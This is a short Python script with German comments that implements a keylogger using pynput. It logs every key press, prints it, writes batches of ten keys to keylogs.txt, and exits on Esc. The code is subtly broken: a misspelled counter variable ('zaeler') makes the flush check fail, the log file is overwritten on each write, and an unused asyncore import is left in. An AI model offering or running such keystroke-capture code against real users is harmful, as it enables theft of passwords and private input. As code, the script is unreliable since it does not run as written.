from asyncore import write
import pynput
from pynput.keyboard import Key, Listener

zaehler = 0 #  variabel
keys = [] #  liste erstellen

def on_press(key):
    global keys, zaehler  # Deklariert die Variablen "keys" und "zaehler" als global um sie außerhalb der Funktion verwenden zu können.

    keys.append(key)  # Fügt das übergebene "key"-Objekt zur Liste "keys" hinzu.
    zaehler += 1  # erhöt den Wert von "zaehler" um 1.
    print("{0} pressed".format(key))  # Meldet dass der übergebene Schlüssel gedrückt wurde.


    if zaeler >= 10: # für jede gedrückte taste wird +1 gezaehlt
        zaehler = 0 #  resetet den zaehler
        write_file(keys)
        keys = [] #  reset faer die liste

def write_file(keys):
    with open("keylogs.txt", "w") as f:  #  schreibt die erkannten tasten in die log datei mit "w" wird diese erstellt (muss ggf. in "a" umgewandelt werden)
        for key in keys:
            f.write(str(key)) # speichert die tasten im str format



def on_release(key):
    if key == Key.esc: #  Bricht aus der schleife wenn esc gedrückt wird
        return False


with Listener(on_press= on_press, on_release=on_release) as listener: # wenn eine Taste Gedrückt wird unbd wenn eine Taste losgelassen wird
    listener.join()
